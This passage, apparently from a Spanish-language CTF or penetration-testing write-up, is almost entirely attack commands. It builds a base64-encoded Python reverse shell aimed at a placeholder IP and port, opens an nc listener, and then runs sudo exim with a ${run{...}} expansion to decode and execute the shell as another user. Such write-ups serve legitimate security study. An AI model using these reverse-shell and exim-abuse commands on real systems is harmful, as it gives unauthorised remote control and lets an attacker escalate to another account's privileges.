Creo el payload:

```bash
echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"IP\",PUERTO));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'" | base64
# Info:
<RESULTADO>
```

Me pongo a la escucha:

```bash
nc -lnvp PUERTO
```

Ejecuto:

```bash
sudo -u USER /usr/sbin/exim -be '${run{/bin/bash -c "echo <RESULTADO> | base64 -d | bash"}}'
```
